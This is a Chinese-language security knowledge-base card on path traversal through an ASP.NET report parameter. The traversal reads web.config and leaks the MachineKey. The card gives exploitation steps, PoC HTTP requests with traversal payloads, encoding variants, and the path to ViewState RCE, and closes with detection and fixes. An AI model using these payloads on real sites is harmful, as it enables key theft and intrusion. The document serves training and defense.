---
id: web-generic-file-inclusion-aspx-report-param-traversal-webconfig
title: ASP.NET 报表参数路径遍历读取 web.config：泄露 MachineKey 与敏感配置
type: scenario
domain: web
path: web/generic/file-inclusion
technique: aspx-report-param-traversal-webconfig
tags:
- file-inclusion
- path-traversal
- aspnet
- iis
- webconfig
- machinekey
- windows
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V74
  verified_at: '2026-11-05T16:34:14+08:00'
  notes: 已对照 content.md 与图21核对：report=../../../../../../windows/win.ini 验证任意文件读、report=web.config 返回 machineKey(validationKey/decryptionKey)、viewStateEncryptionMode=Never、relaxedUrlToFileSystemMapping=true、.config text/plain 均一致。核对时已修正标题/结论中“数据库连接串”的过度表述（原文该 web.config 未含 connectionStrings）。未验证点：win.ini 读取仅原文口述、未复跑。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-aspx-report-param-traversal-webconfig/
draft: false
kb_aliases:
- report 参数路径遍历
- network-reports.aspx 任意文件读
- web.config 读取
- MachineKey 泄露
- ASP.NET 配置文件读取
---

## 一句话结论

当 ASP.NET 报表页把 `report` 参数直接拼进文件路径并返回文件内容时，`report=../../../../windows/win.ini` 可验证任意文件读取，`report=web.config` 则直接拿到 `machineKey` 的 validationKey/decryptionKey 与调试配置；若该文件中还有 `connectionStrings`/`appSettings`，也会一并泄露，为后续伪造 ViewState 反序列化提供全部材料。

## 原理

- 典型实现为 `File.ReadAllText(Server.MapPath("~/reports/") + Request["report"])` 或 `Path.Combine(baseDir, report)`，未取 basename、未规范化、未校验前缀；`../` 会按 Windows 路径语义逐级跳出报表目录。
- IIS/ASP.NET 进程对站点目录与系统目录通常具有读权限（应用池身份可读 `C:\Windows`、站点 `web.config`），因此可以读取配置文件、日志、其他站点源码。
- `web.config` 是高价值目标：`<machineKey validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES"/>` 是 ASP.NET ViewState/Forms 认证的签名与加密密钥；拿到后可以伪造任意 `__VIEWSTATE` 触发反序列化 RCE，或伪造 Forms 认证票据。
- 同一文件还常含 `connectionStrings`（数据库账号口令）、`appSettings`（API Key、SMTP 口令）、`customErrors mode="Off"`（报错回显）、`debug="true"`（调试信息）。
- 该链的关键不是“能读文件”，而是“读到的配置文件包含可用于下一阶段的密钥”；因此它常作为从 Web 入口到 RCE 的跳板。

## 触发条件

- 存在以文件名/路径为参数、读取并回显文件内容的 ASP.NET 页面（报表、下载、预览、模板、日志查看等）。
- 参数直接拼接到物理路径，未做 `Path.GetFileName()`、`Server.MapPath` 边界校验或规范化前缀检查。
- 进程对目标文件有读权限；`web.config` 未被加密/权限隔离。
- 目标 ASP.NET 使用静态 MachineKey（非自动生成/非默认机器级隔离），或配置在站点级。

## 利用步骤

1. 找到疑似文件读取参数（如 `?report=xxx`），先请求正常文件名确认返回内容格式。
2. 用 `../../../../windows/win.ini` 或 `..\..\..\..\windows\win.ini` 验证穿越，观察是否返回 `[fonts]` 等系统文件内容。
3. 读取站点 `web.config`：`?report=web.config`；若页面基于站点根目录，再尝试 `?report=../web.config`、`?report=../../web.config`。
4. 从响应中提取 `machineKey` 的 `validationKey`、`decryptionKey`、`validation`、`decryption`，以及 `connectionStrings`、`appSettings`。
5. 读取 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config` 或 `applicationHost.config`，确认是否有全局配置或 IIS 级信息。
6. 用 MachineKey 构造 ViewState 反序列化 payload（见关联卡），或使用泄露的连接串登录数据库、用 Forms 密钥伪造认证票据。
7. 读取 `web.config` 中的 `httpRuntime relaxedUrlToFileSystemMapping`、`customErrors`、`debug` 等配置，判断后续利用面。

## PoC

```http
GET /network-reports.aspx?report=../../../../../../windows/win.ini HTTP/1.1
Host: target
```

```http
GET /network-reports.aspx?report=web.config HTTP/1.1
Host: target

HTTP/1.1 200 OK
<configuration>
  <system.web>
    <machineKey validationKey="56AB..." decryptionKey="A69D..." validation="SHA1" decryption="AES"/>
    <customErrors mode="Off"/>
    <compilation debug="true"/>
  </system.web>
</configuration>
```

```text
# 其他常见目标
?report=../web.config
?report=C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
?report=..\..\..\..\inetpub\wwwroot\web.config
```

## 变体与关联

- 变体：参数可能需要 URL 编码（`%2e%2e%2f`）、反斜杠（`..\`）、双重编码或绝对路径；按框架的解码顺序调整。
- 变体：IIS 直接映射 `.config` 为 `text/plain` 时，可能无需页面即可下载 `web.config`（`/web.config`），应优先尝试。
- 变体：读取 `applicationHost.config`、`machine.config`、日志文件、其他站点 `web.config`，扩展到同服务器其他应用。
- 关联：[[web-dotnet-deser-viewstate-machinekey-textformattingrunproperties]]（用泄露的 MachineKey 伪造 ViewState 实现 RCE）、[[web-generic-file-inclusion-dotnet-handler-gettxt-path-read]]（同类 .NET 文件读取）、[[web-generic-file-inclusion-encoded-dotdot-predecode-blacklist-bypass]]（编码穿越绕过）。
- 边界：参数只接受白名单文件名、使用 `Server.MapPath` 后做 `StartsWith` 校验、进程以低权限运行且 `web.config` 不可读、或 MachineKey 使用 `AutoGenerate` 且未持久化时，价值下降；但连接串/日志仍可能泄露。

## 检测与防御

- 检测：请求参数中出现 `../`、`..\`、`%2e%2e`、`web.config`、`win.ini`、`applicationHost.config`；报表/下载接口返回非报表目录的文件；同一会话批量请求配置文件。
- 修复：不要用用户输入拼路径；用文件 ID 映射到服务端白名单文件，或 `Path.GetFileName()` 取 basename 后只允许固定后缀。
- 修复：对最终路径 `Path.GetFullPath()` 规范化并校验必须位于报表目录内；拒绝绝对路径与符号链接。
- 加固：`web.config` 设置 ACL，仅应用池与管理員可读；生产环境关闭 `customErrors=Off` 与 `debug=true`；`.config` 禁止通过 IIS 静态下载；MachineKey 使用受保护的密钥存储并定期轮换。
